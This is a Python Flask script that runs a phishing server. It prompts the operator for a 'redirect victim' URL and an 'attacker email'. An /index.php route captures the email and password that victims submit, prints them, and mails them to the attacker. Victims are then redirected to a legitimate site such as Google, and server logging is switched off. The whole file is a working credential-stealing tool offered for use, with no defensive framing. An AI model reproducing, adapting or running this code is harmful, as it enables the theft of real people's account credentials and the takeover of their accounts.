
redirected = input('\033[1;95m redirect victim: \033[1;34m ')
if redirected == "":
        redirected = 'https://www.google.com'
        
else:
        pass
email_555 = input('\033[1;95m your attacker email : \033[1;34m')
if email_555 == "":
    email_555 = "null"
from flask import Flask, render_template
import logging
from flask import  request
import  os 
from send import  enviar_email
import smtplib
import email.message
app = Flask(__name__)

@app.route("/")
def homepage():
    
    n = request.headers
    
    
    print(n['User-Agent'])
    return render_template('homepage.html')
@app.route('/index.php' , methods=["GET"])
def pega():
    nome = request.args.get('email')
    password1 = request.args.get('pass')
    print(f'''
\033[1;90m[✓] victim's email : \033[1;92m{nome} \n
\033[1;90m[✓] victim password : \033[1;92m{password1}
\n\n   ''')
    try:
        if password1 == "":
            password1 = "failed victim no password"
        elif nome == "":
            nome = "failed victim no password"
        if email_555 == "":
            pass
        else:
            enviar_email(dono=email_555,emaik=nome,password=password1)
    except NameError as err:
        print(err)

   
    return app.redirect(redirected)


# colocar o site no ar
if __name__ == "__main__":
    def run():
        #redirected= ""
        logging.basicConfig(filename='error.log', level=logging.WARNING)
        log = logging.getLogger('werkzeug')
        log.disabled = True
        app.logger.disabled = True
        logging.getLogger('werkzeug').disabled = True
        logging.getLogger('werkzeug').setLevel(logging.CRITICAL)
        os.system('clear')
        print('\033[1;97m[+] url send vitamin : \033[1;32m http://127.0.0.1:5001 	\033[1;92m')
        print(f'''\033[1;97m[+] send email :\033[1;92m {email_555}\n\033[1;97m[+] GHITHUB : \033[1;92m https://github.com/L4NBY \n\n''')
        
        logging.basicConfig(filename='record.log',
        level=logging.DEBUG, format='%(asctime)s %(levelname)s %(name)s %(threadName)s : %(message)s')
      
        app.run(debug=False, port=5001)
        
        
        
    run()

    # servidor do heroku__name__